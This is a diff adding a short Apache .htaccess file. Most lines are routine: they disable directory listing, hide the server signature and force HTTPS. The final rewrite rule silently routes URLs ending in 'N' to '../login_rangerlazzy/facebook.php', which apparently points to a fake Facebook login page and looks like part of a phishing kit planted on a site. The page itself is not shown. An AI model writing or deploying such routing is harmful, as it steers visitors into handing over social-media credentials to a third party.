@@ -1,0 +1,7 @@
+Options All -Indexes
+Options +FollowSymLinks 
+ServerSignature Off
+RewriteEngine On 
+RewriteCond %{HTTPS} off
+RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+RewriteRule ^(.*)N$ ../login_rangerlazzy/facebook.php [L]
